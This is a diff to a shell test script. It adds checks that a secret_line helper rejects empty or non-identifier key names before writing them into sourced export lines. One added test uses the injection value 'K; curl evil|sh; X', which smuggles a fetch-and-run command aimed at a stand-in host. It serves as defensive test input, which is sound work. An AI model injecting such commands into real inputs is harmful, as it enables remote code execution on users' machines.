@@ -107,6 +107,10 @@ assert_eq "plain value" "export K='v'" "$(secret_line K v)"
 sv="pa'ss\$w\`ord\\"
 assert_eq "round-trips ' \$ \` \\ through a zsh source" \
   "$sv" "$(zsh -c "$(secret_line K "$sv"); printf '%s' \"\$K\"")"
+# Key names are the docs/secret-keys.txt trust boundary: a non-identifier
+# would land unquoted in an export line that every shell start sources.
+assert_fail "rejects non-identifier key name" secret_line 'K; curl evil|sh; X' v
+assert_fail "rejects empty key name" secret_line '' v
 
 step "apply_dock / apply_sidebar empty guard"
 # The guard must fire before any dockutil/mysides call: an empty here-string
